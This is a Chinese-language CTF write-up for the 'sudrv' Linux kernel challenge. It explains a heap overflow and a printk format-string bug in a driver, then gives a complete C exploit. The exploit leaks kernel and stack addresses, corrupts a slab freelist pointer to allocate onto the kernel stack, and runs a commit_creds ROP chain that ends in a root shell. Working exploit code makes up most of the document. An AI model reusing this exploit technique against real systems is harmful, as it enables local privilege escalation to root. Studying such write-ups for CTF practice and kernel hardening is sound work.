# sudrv

大年初一躲在家里，狗命要紧

## 漏洞点

- 堆溢出
- 格式化字符串

### 堆溢出

```c
signed __int64 sudrv_write()
{
  JUMPOUT(copy_user_generic_unrolled(su_buf), 0, sudrv_write_cold_1);
  return -1LL;
}
```

这里并没有对size进行任何的检查

### 格式化字符串

```c
__int64 __fastcall sudrv_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 result; // rax

  switch ( a2 )
  {
    case 0x73311337:
      if ( (unsigned __int64)(a3 - 1) > 0xFFE )
        return 0LL;
      su_buf = (char *)_kmalloc(a3, 0x480020LL);
      result = 0LL;
      break;
    case (int)0xDEADBEEF:
      JUMPOUT(su_buf, 0LL, sudrv_ioctl_cold_2);
      result = 0LL;
      break;
    case 0x13377331:
      kfree(su_buf);
      result = 0LL;
      su_buf = 0LL;
      break;
    default:
      return 0LL;
  }
  return result;
}
```

当a2为`0xdeadbeef`的时候，对应的汇编代码：

```asm
.text:0000000000000078                 mov     rdi, cs:su_buf
.text:000000000000007F                 test    rdi, rdi
.text:0000000000000082                 jnz     sudrv_ioctl_cold_2
.text:0000000000000088                 xor     eax, eax
.text:000000000000008A                 retn
```

`sudrv_ioctl_cold_2`处：

```asm
.text.unlikely:00000000000000B8 sudrv_ioctl_cold_2 proc near            ; CODE XREF: sudrv_ioctl+62↑j
.text.unlikely:00000000000000B8                 call    printk          ; PIC mode
.text.unlikely:00000000000000BD
.text.unlikely:00000000000000BD loc_BD:                                 ; DATA XREF: .orc_unwind_ip:0000000000000261↓o
.text.unlikely:00000000000000BD                                         ; .orc_unwind_ip:0000000000000265↓o
.text.unlikely:00000000000000BD                 jmp     loc_38
.text.unlikely:00000000000000BD sudrv_ioctl_cold_2 endp
```

直接调用了`printk`，造成了格式化字符串漏洞

## 思路

- 格式化字符串泄露kernel基地址和栈地址
- 利用堆溢出把下一块的chunk的指针指向栈地址，多次分配到栈上ROP

exp:

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <pthread.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <pty.h>
#include <signal.h>

#define kalloc	0x73311337
#define kfree	0x13377331
#define printk	0xDEADBEEF

#define prepare_off	0x81790
#define commit_off	0x81410
#define pop_rdi_ret	0x1388
#define pop_rdx_ret	0x44f17
#define mv_rax_in_rdx 0xbe785
#define swapgs_popfq 0xa00d5a
#define iretq 0x21762
//0xffffffff81a00d5a: swapgs; popfq; ret;
//0xffffffff81021762: iretq; ret; 
size_t user_cs,user_ss,user_eflags,user_sp;

void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

void get_shell(int argc){
	puts("get shell!");
	// system("/bin/sh");
	char *argv[]={"sh",NULL};
	execve("/bin/sh",argv,NULL);
}

int main(){
	setbuf(stdout,0);
	int fd = open("/dev/meizijiutql",O_RDWR);
	signal(SIGSEGV,get_shell);
	size_t stack;
	size_t vmlinux_base;
	size_t ret_addr;
	char fmt_str[0x100] = "%lx %lx %lx %lx %lx vmlinux:0x%lx %lx-%lx-%lx stack:0x%lx %lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx-%lx\n";
	char p[0x2000];
	int i = 0;
	// for (i = 0; i < 0x103; i++)
	// 	ioctl(fd, kalloc, 0xff8);
	ioctl(fd,kalloc,0xff0);
	write(fd,fmt_str,0x100);
	ioctl(fd,0xdeadbeef);
	printf("input the stack addr: ");
	scanf("%lx",&stack);
	stack = stack & 0xfffffffffffff000;
	ret_addr = stack+0x1000-0x1b8;
	printf("input the vmlinux addr: ");
	scanf("%lx",&vmlinux_base);
	vmlinux_base = vmlinux_base & 0xfffffffffff00000;
	vmlinux_base -= 0x100000;

	printf("[*]vmlinux_base : 0x%lx\n",vmlinux_base);
	printf("[*]stack : 0x%lx\n",stack);
	printf("[*]ret_addr : 0x%lx\n",ret_addr);
	memset(p,'\x90',0x1000);
	*(size_t*)(p+0x1000) = stack;
	write(fd, p, 0x1008);
	size_t* rop = (size_t*)(&p[0xe50-8]);//0xffffb75380143e48 -> 0xffffffffc035100c (sudrv_write+12) <- test   eax, eax /* 0
	printf("[*]rop : 0x%lx\n",rop);
	printf("pop_rdi = 0x%lx\n",pop_rdi_ret+vmlinux_base);
	printf("start alloc....\n");
	save_stats();
	rop[i++] = vmlinux_base + pop_rdi_ret;
	rop[i++] = 0;
	rop[i++] = vmlinux_base + prepare_off;
	rop[i++] = vmlinux_base + pop_rdx_ret;
	rop[i++] = ret_addr + 0x38;
	rop[i++] = vmlinux_base + mv_rax_in_rdx;
	rop[i++] = vmlinux_base + pop_rdi_ret;
	rop[i++] = 0xcafebabe;
	rop[i++] = vmlinux_base + commit_off;
 	rop[i++] = vmlinux_base + swapgs_popfq;
 	rop[i++] = 0x246;
 	rop[i++] = vmlinux_base + iretq;
 	rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_eflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;
	rop[i++] = 0;
	for(i = 0; i < 0x800;i++){
		ioctl(fd,kalloc,0xff0);
		write(fd,p,0x1000);
	}

	close(fd);
	return 0;
}
```

## 后记

解出了这题其实还是很开心的，中间踩了许多的坑，总之收获挺大的，:smiley:

## 参考链接：

[slab分配图解]( https://blog.csdn.net/lukuen/article/details/6935068 )

[ https://blog.de1ta.club/2019/08/19/SUCTF2019/ ]( https://blog.de1ta.club/2019/08/19/SUCTF2019/ )

[ https://github.com/team-su/SUCTF-2019/blob/master/Pwn/sudrv/exp/pwn.c ]( https://github.com/team-su/SUCTF-2019/blob/master/Pwn/sudrv/exp/pwn.c )